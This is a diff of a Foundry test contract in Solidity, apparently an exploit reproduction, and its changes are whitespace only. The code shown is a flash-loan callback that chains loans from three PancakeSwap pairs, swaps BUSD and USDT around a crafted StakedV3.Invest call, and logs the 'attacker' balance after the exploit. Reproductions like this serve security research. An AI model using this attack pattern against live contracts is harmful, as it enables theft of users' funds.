@@ -57,30 +57,24 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint(
             "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
-        );
+            );
     }
 
     function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
         if (msg.sender == address(Pair1)) {
-
             Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));
             uint256 repayAmount = abi.decode(data, (uint256));
             BUSD.transfer(address(Pair1), repayAmount + amount1);
-
         } else if (msg.sender == address(Pair2)) {
-
             Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));
             uint256 repayAmount = abi.decode(data, (uint256));
             BUSD.transfer(address(Pair2), repayAmount + amount1);
-
         } else if (msg.sender == address(Pair3)) {
-
             BUSDToUSDT();
             StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT
             USDTToBUSD();
             uint256 repayAmount = abi.decode(data, (uint256));
             BUSD.transfer(address(Pair3), repayAmount + amount1);
-
         }
     }
 
